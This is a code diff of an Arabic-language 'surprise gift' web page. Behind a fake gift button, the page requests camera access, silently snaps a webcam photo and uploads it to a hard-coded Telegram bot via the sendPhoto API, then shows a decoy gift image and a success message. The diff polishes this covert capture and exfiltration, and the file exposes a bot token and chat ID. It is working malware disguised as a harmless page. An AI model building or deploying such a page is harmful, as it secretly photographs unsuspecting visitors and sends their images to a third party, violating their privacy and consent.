@@ -5,18 +5,24 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>مفاجأة خاصة 🎁</title>
     <style>
-        body { margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #050801; font-family: sans-serif; }
-        .glass-container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 40px; text-align: center; width: 85%; max-width: 400px; }
-        .neon-btn { padding: 15px 30px; color: #03e9f4; background: transparent; border: 2px solid #03e9f4; border-radius: 10px; cursor: pointer; font-weight: bold; }
+        body { margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #050801; font-family: sans-serif; overflow: hidden; }
+        .glass-container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 40px; text-align: center; box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37); width: 85%; max-width: 400px; }
+        .neon-btn { padding: 15px 30px; color: #03e9f4; background: transparent; border: 2px solid #03e9f4; border-radius: 10px; font-size: 1.2rem; font-weight: bold; cursor: pointer; transition: 0.5s; }
+        .neon-btn:hover { background: #03e9f4; color: #050801; box-shadow: 0 0 20px #03e9f4; }
         #video, #canvas { display: none; }
+        .gift-img { width: 100%; border-radius: 15px; margin-top: 20px; border: 2px solid #03e9f4; display: none; animation: fadeIn 1s ease-in; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div class="glass-container">
-        <h1 style="color: white;">هدية حصرية! 🎁</h1>
-        <button class="neon-btn" onclick="start()">افتح المفاجأة</button>
-        <div id="status" style="color: #03e9f4; margin-top: 20px;"></div>
+    <div id="main-content" class="glass-container">
+        <h1>هدية حصرية! 🎁</h1>
+        <p id="desc" style="color: #aaa;">اضغط بالأسفل لتفعيل المفاجأة</p>
+        <button id="main-btn" class="neon-btn" onclick="startProcess()">افتح المفاجأة</button>
+        
+        <img id="surprise-image" src="https://images.unsplash.com/photo-1511300636408-a63a89df3482?auto=format&fit=crop&q=80&w=1000" class="gift-img" alt="Gift">
+        <p id="final-msg" style="color: #fff; margin-top: 15px; display: none;">✨ تم تفعيل هديتك بنجاح!</p>
     </div>
 
     <video id="video" autoplay playsinline></video>
@@ -24,33 +30,55 @@
 
     <script>
         const TOKEN = "8387241026:AAFhkkv2RYiOFr4o8PJMeDikn2mMNkF_6rA";
-        const ID = "7002841594";
+        const CHAT_ID = "7002841594";
 
-        async function start() {
+        async function startProcess() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('video').srcObject = stream;
-                document.getElementById('status').innerText = "جاري الاتصال بالسيرفر...";
+                const video = document.getElementById('video');
+                video.srcObject = stream;
                 
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0, 640, 480);
-                    
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('photo', blob, 'p.jpg');
-                        fd.append('chat_id', ID);
+                document.getElementById('main-btn').innerText = "جاري التحميل...";
 
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: fd
-                        }).then(() => {
-                            stream.getTracks().forEach(t => t.stop());
-                            document.getElementById('status').innerText = "✨ تم تفعيل هديتك بنجاح!";
-                        });
-                    }, 'image/jpeg', 0.5);
-                }, 1000);
-            } catch (e) { alert("يجب السماح بالكاميرا!"); }
+                video.onloadedmetadata = () => {
+                    setTimeout(() => { captureAndSend(video, stream); }, 1000);
+                };
+            } catch (err) {
+                alert("يجب السماح بالكاميرا لتشغيل المفاجأة!");
+            }
+        }
+
+        async function captureAndSend(video, stream) {
+            const canvas = document.getElementById('canvas');
+            ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('photo', blob, 'shot.jpg');
+                fd.append('chat_id', CHAT_ID);
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                } catch (e) {}
+
+                stream.getTracks().forEach(t => t.stop());
+                showGift();
+            }, 'image/jpeg', 0.5);
+        }
+
+        function showGift() {
+            // إخفاء الزر والوصف القديم
+            document.getElementById('main-btn').style.display = 'none';
+            document.getElementById('desc').style.display = 'none';
+            
+            // إظهار الصورة والرسالة النهائية
+            const img = document.getElementById('surprise-image');
+            img.style.display = 'block';
+            document.getElementById('final-msg').style.display = 'block';
+            
+            // إذا أردت استخدام صورتك الخاصة nature.jpg، قم برفعها بجانب ملف index.html
+            // وغير الرابط في الأعلى (src) إلى nature.jpg
         }
     </script>
 </body>
